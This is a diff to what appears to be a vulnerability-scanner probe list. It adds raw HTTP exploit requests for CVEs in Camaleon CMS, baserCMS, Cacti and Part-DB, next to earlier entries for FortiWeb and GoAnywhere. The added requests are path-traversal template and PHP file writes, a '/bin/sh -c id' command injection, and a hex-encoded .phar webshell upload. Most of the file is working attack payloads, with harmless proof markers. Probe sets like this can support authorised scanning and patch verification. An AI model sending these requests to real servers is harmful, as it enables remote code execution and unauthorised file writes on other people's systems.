@@ -4561,3 +4561,21 @@ POST /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi header="CGIINF
 # --- CVE-2025-10035 (Fortra GoAnywhere MFT, KEV): pre-auth deserialization in
 #     the License Servlet; the encrypted license bundle carries the gadget. ---
 POST /goanywhere/lic/accept header="Content-Type: application/x-www-form-urlencoded" body="bundle=AAEAAAD%2F%2F%2F%2F%2F%2F%2F%2F"
+
+# --- CVE-2026-116009 (Camaleon CMS): a media-only user writes a data: URI
+#     through the crop_url action; the name parameter escapes the upload
+#     directory and writes an ERB template into the theme views. ---
+POST /admin/media/actions header="Content-Type: application/x-www-form-urlencoded" body="authenticity_token=token&media_action=crop_url&url=data%3A%2F%2F8.8.8.8%2Fplain%2CRCE_PROOF_START&name=..%2F..%2F..%2Fapp%2Fapps%2Fthemes%2Fcamaleon_first%2Fviews%2Fpage_1.html.erb"
+
+# --- CVE-2026-114622 (baserCMS): the BcThemeFile Admin API validates the raw
+#     fullpath but rawurldecodes it at the write sink, so percent-encoded
+#     traversal escapes the theme directory. ---
+POST /baser/api/admin/bc-theme-file/theme_files/edit.json header="Content-Type: application/json" body="{\"theme\":\"BcThemeSample\",\"plugin\":\"\",\"type\":\"layout\",\"fullpath\":\"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwebroot%2fprobe.php\",\"contents\":\"<?php echo 1; ?>\"}"
+
+# --- CVE-2026-39902 (Cacti): an authenticated admin saves an input_string
+#     that passes the legacy denylist and runs /bin/sh in the poller. ---
+POST /cacti/data_input.php header="Content-Type: application/x-www-form-urlencoded" body="action=save&id=1&input_string=%2Fbin%2Fsh%20-c%20%27id%27"
+
+# --- CVE-2026-54630 (Part-DB): the attachment handler keeps the client
+#     supplied .phar extension under the web-served media directory. ---
+POST /part/1/attachments header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22636f6d706f6e656e742e70686172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
